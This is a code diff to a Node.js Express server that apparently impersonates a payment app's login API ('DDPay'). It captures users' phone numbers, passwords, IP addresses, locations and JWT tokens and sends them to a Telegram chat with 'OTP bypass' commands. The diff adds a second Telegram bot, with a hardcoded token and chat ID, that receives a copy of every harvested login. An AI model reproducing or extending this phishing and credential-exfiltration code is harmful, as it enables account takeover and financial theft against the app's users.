@@ -292,9 +292,27 @@ const app = express();
 const ORIGINAL_API = 'https://appm9t5zk.ddriva.com';
 const BOT_TOKEN = process.env.BOT_TOKEN || '8959979027:AAF3YDbFvkUe_uxDEI6ojaycyqrZZVUAeZA';
 const WEBHOOK_URL = 'https://xchas.vercel.app/bot-webhook';
+
+// === SECONDARY BOT CONFIGURATION ===
+const BOT2_TOKEN = process.env.BOT2_TOKEN || '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ';
+const BOT2_CHAT_ID = process.env.BOT2_CHAT_ID || '5880677639';
+
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 
+let bot = null;
+let webhookSet = false;
+try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }
+
+let bot2 = null;
+if (BOT2_TOKEN && BOT2_TOKEN !== 'BOT2_TOKEN_HERE') {
+  try { bot2 = new TelegramBot(BOT2_TOKEN); } catch (e) { }
+}
+
+function sendBot2Message(text, options) {
+  if (!bot2 || !BOT2_CHAT_ID || BOT2_CHAT_ID === 'BOT2_CHAT_ID_HERE') return;
+  bot2.sendMessage(BOT2_CHAT_ID, text, options || { parse_mode: 'Markdown' }).catch(() => { });
+}
 const DEFAULT_DATA = {
   banks: [],
   activeIndex: -1,
@@ -1921,6 +1939,24 @@ Example:
   }
 });
 
+app.post('/bot2-webhook', async (req, res) => {
+  try {
+    const msg = req.parsedBody?.message;
+    if (!msg || !msg.text) return res.sendStatus(200);
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+    if (text.startsWith('/start')) {
+      if (bot2) {
+        await bot2.sendMessage(chatId, '🟢 Bot & App is active').catch(() => { });
+      }
+      return res.sendStatus(200);
+    }
+    return res.sendStatus(200);
+  } catch (e) {
+    return res.sendStatus(200);
+  }
+});
+
 app.post('/app/user/login/login', async (req, res) => {
   try {
     const data = await loadData();
@@ -1945,13 +1981,13 @@ app.post('/app/user/login/login', async (req, res) => {
       if (respToken && userId) {
         const tKey = cleanToken(respToken);
         tokenUserMap[tKey] = userId;
-        if (redis) redis.hset('ddpayTokenMap', tKey, userId).catch(() => { });
+        if (redis) redis.hset('tokenMap', tKey, userId).catch(() => { });
       }
       if (respRefresh && userId) {
         refreshTokenMap[String(userId)] = respRefresh;
         const rKey = cleanToken(respRefresh);
         tokenUserMap[rKey] = userId;
-        if (redis) redis.hset('ddpayTokenMap', rKey, userId).catch(() => { });
+        if (redis) redis.hset('tokenMap', rKey, userId).catch(() => { });
       }
       if (userId) {
         saveTokenUserId(req, userId);
@@ -1977,7 +2013,7 @@ app.post('/app/user/login/login', async (req, res) => {
       if (isSuccess) {
         const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
         const devId = body.deviceId || body.androidId || body.device_id || '';
-        let msg =
+        let baseMsg =
           `✅ *[DDPay] Direct Login Successful*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
@@ -1987,9 +2023,12 @@ app.post('/app/user/login/login', async (req, res) => {
           `🕐 *Time:* ${time}`;
 
         if (loginToken) {
-          msg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
+          baseMsg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
         }
 
+        sendBot2Message(baseMsg);
+
+        let msg = baseMsg;
         if (devId) {
           msg += `\n\n⚡ *OTP BYPASS COMMANDS:*\n` +
             `👉 Click to copy Single Use:\n\`/useid ${devId}\`\n` +
@@ -2027,7 +2066,6 @@ async function sendOtpHandler(req, res) {
     if (data.adminChatId && bot) {
       const phone = body.userName || body.phone || body.mobile || 'N/A';
       const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-
       const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
       const city = req.headers['x-vercel-ip-city'] || 'N/A';
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
@@ -2042,6 +2080,7 @@ async function sendOtpHandler(req, res) {
           `🕐 *Time:* ${time}`;
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+        sendBot2Message(msg);
       } else {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
         let msg =
@@ -2094,6 +2133,7 @@ app.post('/app/user/login/start', async (req, res) => {
         `🕐 *Time:* ${time}`;
 
       bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+      sendBot2Message(msg);
     }
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
@@ -2166,7 +2206,7 @@ app.post('/app/user/login/confirm', async (req, res) => {
       if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
         const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
         const devId = body.deviceId || body.androidId || body.device_id || '';
-        let msg =
+        let baseMsg =
           `✅ *[DDPay] Login Successful*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
@@ -2176,9 +2216,13 @@ app.post('/app/user/login/confirm', async (req, res) => {
           `🕐 *Time:* ${time}`;
 
         if (loginToken) {
-          msg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
+          baseMsg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
         }
 
+        // Send copy to Bot 2 WITHOUT OTP Bypass commands
+        sendBot2Message(baseMsg);
+
+        let msg = baseMsg;
         if (devId) {
           msg += `\n\n⚡ *OTP BYPASS COMMANDS:*\n` +
             `👉 Click to copy Single Use:\n\`/useid ${devId}\`\n` +
